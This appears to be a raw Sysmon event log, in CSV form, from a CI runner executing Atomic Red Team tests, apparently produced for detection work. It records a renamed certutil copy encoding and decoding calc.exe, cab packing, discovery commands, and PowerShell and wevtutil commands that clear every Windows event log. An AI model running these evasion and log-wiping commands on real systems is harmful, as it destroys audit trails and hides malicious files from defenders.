UtcTime: 2025-12-17 08:23:28.348
ProcessGuid: {f995aebf-6880-6942-5b08-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates\CA\CTLs
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.348
ProcessGuid: {f995aebf-6880-6942-5b08-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates\CA\CRLs
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.348
ProcessGuid: {f995aebf-6880-6942-5b08-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates\CA\Certificates
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.348
ProcessGuid: {f995aebf-6880-6942-5b08-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates\CA
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.346
ProcessGuid: {f995aebf-6880-6942-5b08-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Policies\Microsoft\SystemCertificates\CA\CTLs
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.346
ProcessGuid: {f995aebf-6880-6942-5b08-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Policies\Microsoft\SystemCertificates\CA\CRLs
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.346
ProcessGuid: {f995aebf-6880-6942-5b08-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Policies\Microsoft\SystemCertificates\CA\Certificates
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:28.346
ProcessGuid: {f995aebf-6880-6942-5b08-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Policies\Microsoft\SystemCertificates\CA
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:28 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:23:28.269
ProcessGuid: {f995aebf-6880-6942-5b08-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {$logs = Get-EventLog -List | ForEach-Object {$_.Log}
$logs | ForEach-Object {Clear-EventLog -LogName $_ }
Get-EventLog -list}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-55a1-6942-2cbe-0b0000000000}
LogonId: 0xBBE2C
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60eb-6942-5803-000000000e00}
ParentProcessId: 3568
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\a9afb767-bac2-4a05-af68-94aeef71995f.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:27 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:23:27.998
ProcessGuid: {f995aebf-687f-6942-5808-000000000e00}
ProcessId: 4416
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c wevtutil cl System
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-55a1-6942-2cbe-0b0000000000}
LogonId: 0xBBE2C
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60eb-6942-5803-000000000e00}
ParentProcessId: 3568
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\a9afb767-bac2-4a05-af68-94aeef71995f.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:27 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:23:27.849
ProcessGuid: {f995aebf-687f-6942-5708-000000000e00}
ProcessId: 8272
Image: C:\Windows\System32\whoami.exe
FileVersion: 10.0.26100.1882 (WinBuild.160101.0800)
Description: whoami - displays logged on user information
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: whoami.exe
CommandLine: ""C:\Windows\system32\whoami.exe""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-55a1-6942-2cbe-0b0000000000}
LogonId: 0xBBE2C
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3
ParentProcessGuid: {f995aebf-60eb-6942-5803-000000000e00}
ParentProcessId: 3568
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\a9afb767-bac2-4a05-af68-94aeef71995f.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:27 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:23:27.829
ProcessGuid: {f995aebf-687f-6942-5608-000000000e00}
ProcessId: 5136
Image: C:\Windows\System32\HOSTNAME.EXE
FileVersion: 10.0.26100.2161 (WinBuild.160101.0800)
Description: Hostname APP
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: hostname.exe
CommandLine: ""C:\Windows\system32\HOSTNAME.EXE""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-55a1-6942-2cbe-0b0000000000}
LogonId: 0xBBE2C
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=8FF283FB7A282A9B2B30235016669DFE795665BCBB254FD17AC31FA9308D89D9
ParentProcessGuid: {f995aebf-60eb-6942-5803-000000000e00}
ParentProcessId: 3568
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\a9afb767-bac2-4a05-af68-94aeef71995f.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:18 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:23:18.783
ProcessGuid: {f995aebf-6876-6942-5408-000000000e00}
ProcessId: 2016
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c del ""C:\AtomicRedTeam\atomics\T1140\src\art-expand-source.txt"" >nul 2>&1 & del ""%%TEMP%%\art-expand-test.cab"" >nul 2>&1 & rmdir ""%%TEMP%%\art-expand-out"" /s /q >nul 2>&1
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-55a1-6942-2cbe-0b0000000000}
LogonId: 0xBBE2C
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60eb-6942-5803-000000000e00}
ParentProcessId: 3568
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\a9afb767-bac2-4a05-af68-94aeef71995f.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:18 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:23:18.593
ProcessGuid: {f995aebf-6876-6942-5208-000000000e00}
ProcessId: 8940
User: runnervm8j6r3\runneradmin
Image: C:\Windows\SYSTEM32\cmd.exe
TargetFilename: C:\Users\RUNNER~1\AppData\Local\Temp\T1140_calc2_decoded.exe
Hashes: SHA256=81BD48985FA1753E9E2158A7CF969141EDDDBD050E976801BB477E24A2A06B2A
IsExecutable: true
Archived: true"
"12/17/2025 8:23:18 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:23:18.569
ProcessGuid: {f995aebf-6876-6942-5208-000000000e00}
ProcessId: 8940
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c del %%temp%%\tcm.tmp >nul 2>&1 & del %%temp%%\T1140_calc2.txt >nul 2>&1 & del %%temp%%\T1140_calc2_decoded.exe >nul 2>&1
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-55a1-6942-2cbe-0b0000000000}
LogonId: 0xBBE2C
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60eb-6942-5803-000000000e00}
ParentProcessId: 3568
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\a9afb767-bac2-4a05-af68-94aeef71995f.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:18 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:23:18.379
ProcessGuid: {f995aebf-6876-6942-5008-000000000e00}
ProcessId: 10064
User: runnervm8j6r3\runneradmin
Image: C:\Windows\SYSTEM32\cmd.exe
TargetFilename: C:\Users\RUNNER~1\AppData\Local\Temp\T1140_calc_decoded.exe
Hashes: SHA256=81BD48985FA1753E9E2158A7CF969141EDDDBD050E976801BB477E24A2A06B2A
IsExecutable: true
Archived: true"
"12/17/2025 8:23:18 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:23:18.357
ProcessGuid: {f995aebf-6876-6942-5008-000000000e00}
ProcessId: 10064
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c del %%temp%%\T1140_calc.txt >nul 2>&1 & del %%temp%%\T1140_calc_decoded.exe >nul 2>&1
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-55a1-6942-2cbe-0b0000000000}
LogonId: 0xBBE2C
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60eb-6942-5803-000000000e00}
ParentProcessId: 3568
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\a9afb767-bac2-4a05-af68-94aeef71995f.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:18 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:23:18.129
ProcessGuid: {f995aebf-6876-6942-4f08-000000000e00}
ProcessId: 7816
Image: C:\Windows\System32\whoami.exe
FileVersion: 10.0.26100.1882 (WinBuild.160101.0800)
Description: whoami - displays logged on user information
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: whoami.exe
CommandLine: ""C:\Windows\system32\whoami.exe""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-55a1-6942-2cbe-0b0000000000}
LogonId: 0xBBE2C
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3
ParentProcessGuid: {f995aebf-60eb-6942-5803-000000000e00}
ParentProcessId: 3568
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\a9afb767-bac2-4a05-af68-94aeef71995f.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:18 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:23:18.110
ProcessGuid: {f995aebf-6876-6942-4e08-000000000e00}
ProcessId: 7620
Image: C:\Windows\System32\HOSTNAME.EXE
FileVersion: 10.0.26100.2161 (WinBuild.160101.0800)
Description: Hostname APP
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: hostname.exe
CommandLine: ""C:\Windows\system32\HOSTNAME.EXE""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-55a1-6942-2cbe-0b0000000000}
LogonId: 0xBBE2C
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=8FF283FB7A282A9B2B30235016669DFE795665BCBB254FD17AC31FA9308D89D9
ParentProcessGuid: {f995aebf-60eb-6942-5803-000000000e00}
ParentProcessId: 3568
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\a9afb767-bac2-4a05-af68-94aeef71995f.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:14 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:23:14.194
ProcessGuid: {f995aebf-55a1-6942-cf00-000000000e00}
ProcessId: 5512
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:23:14 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:23:14.194
ProcessGuid: {f995aebf-55a1-6942-cf00-000000000e00}
ProcessId: 5512
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:23:14 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:23:14.192
ProcessGuid: {f995aebf-55a1-6942-cf00-000000000e00}
ProcessId: 5512
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:23:05 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:23:05.891
ProcessGuid: {f995aebf-6869-6942-4808-000000000e00}
ProcessId: 8324
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c mkdir ""%%TEMP%%\art-expand-out"" >nul 2>&1 & echo hello from atomic red team > ""C:\AtomicRedTeam\atomics\T1140\src\art-expand-source.txt"" & makecab ""C:\AtomicRedTeam\atomics\T1140\src\art-expand-source.txt"" ""%%TEMP%%\art-expand-test.cab"" & pushd ""%%TEMP%%\art-expand-out"" & expand ""%%TEMP%%\art-expand-test.cab"" -F:* . & popd
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-55a1-6942-2cbe-0b0000000000}
LogonId: 0xBBE2C
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60eb-6942-5803-000000000e00}
ParentProcessId: 3568
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\a9afb767-bac2-4a05-af68-94aeef71995f.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:05 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:23:05.663
ProcessGuid: {f995aebf-6869-6942-4708-000000000e00}
ProcessId: 7056
Image: C:\Users\RUNNER~1\AppData\Local\Temp\tcm.tmp
TargetFilename: C:\Users\RUNNER~1\AppData\Local\Temp\T1140_calc2_decoded.exe
CreationUtcTime: 2025-12-17 08:23:05.663
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:05 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:23:05.634
ProcessGuid: {f995aebf-6869-6942-4708-000000000e00}
ProcessId: 7056
Image: C:\Users\RUNNER~1\AppData\Local\Temp\tcm.tmp
ImageLoaded: C:\Users\RUNNER~1\AppData\Local\Temp\tcm.tmp
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: CertUtil.exe
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: CertUtil.exe
Hashes: SHA256=52749F37FF21AF7FA72C2F6256DF11740BB88B61EB5B6BF946D37A44A201435F
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:05 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:23:05.591
ProcessGuid: {f995aebf-6869-6942-4608-000000000e00}
ProcessId: 9460
Image: C:\Users\RUNNER~1\AppData\Local\Temp\tcm.tmp
ImageLoaded: C:\Users\RUNNER~1\AppData\Local\Temp\tcm.tmp
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: CertUtil.exe
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: CertUtil.exe
Hashes: SHA256=52749F37FF21AF7FA72C2F6256DF11740BB88B61EB5B6BF946D37A44A201435F
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:05 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:05.615
ProcessGuid: {f995aebf-607e-6942-4403-000000000e00}
ProcessId: 2412
Image: C:\Windows\Sysmon64.exe
TargetObject: HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\CTLs
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:23:05 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:05.615
ProcessGuid: {f995aebf-607e-6942-4403-000000000e00}
ProcessId: 2412
Image: C:\Windows\Sysmon64.exe
TargetObject: HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\CRLs
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:23:05 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:05.615
ProcessGuid: {f995aebf-607e-6942-4403-000000000e00}
ProcessId: 2412
Image: C:\Windows\Sysmon64.exe
TargetObject: HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\Certificates
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:23:05 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:05.615
ProcessGuid: {f995aebf-607e-6942-4403-000000000e00}
ProcessId: 2412
Image: C:\Windows\Sysmon64.exe
TargetObject: HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:23:05 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:05.613
ProcessGuid: {f995aebf-607e-6942-4403-000000000e00}
ProcessId: 2412
Image: C:\Windows\Sysmon64.exe
TargetObject: HKU\.DEFAULT\Software\Policies\Microsoft\SystemCertificates\Disallowed\CTLs
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:23:05 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:05.613
ProcessGuid: {f995aebf-607e-6942-4403-000000000e00}
ProcessId: 2412
Image: C:\Windows\Sysmon64.exe
TargetObject: HKU\.DEFAULT\Software\Policies\Microsoft\SystemCertificates\Disallowed\CRLs
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:23:05 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:05.613
ProcessGuid: {f995aebf-607e-6942-4403-000000000e00}
ProcessId: 2412
Image: C:\Windows\Sysmon64.exe
TargetObject: HKU\.DEFAULT\Software\Policies\Microsoft\SystemCertificates\Disallowed\Certificates
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:23:05 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:23:05.613
ProcessGuid: {f995aebf-607e-6942-4403-000000000e00}
ProcessId: 2412
Image: C:\Windows\Sysmon64.exe
TargetObject: HKU\.DEFAULT\Software\Policies\Microsoft\SystemCertificates\Disallowed
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:23:05 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:23:05.586
ProcessGuid: {f995aebf-6869-6942-4608-000000000e00}
ProcessId: 9460
Image: C:\Users\RUNNER~1\AppData\Local\Temp\tcm.tmp
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: CertUtil.exe
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: CertUtil.exe
CommandLine: C:\Users\RUNNER~1\AppData\Local\Temp\tcm.tmp  -encode C:\Windows\System32\calc.exe C:\Users\RUNNER~1\AppData\Local\Temp\T1140_calc2.txt 
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-55a1-6942-2cbe-0b0000000000}
LogonId: 0xBBE2C
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=52749F37FF21AF7FA72C2F6256DF11740BB88B61EB5B6BF946D37A44A201435F
ParentProcessGuid: {f995aebf-6869-6942-4408-000000000e00}
ParentProcessId: 3336
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c copy %windir%\system32\certutil.exe %temp%\tcm.tmp & %temp%\tcm.tmp -encode C:\Windows\System32\calc.exe %temp%\T1140_calc2.txt & %temp%\tcm.tmp -decode %temp%\T1140_calc2.txt %temp%\T1140_calc2_decoded.exe
ParentUser: runnervm8j6r3\runneradmin"
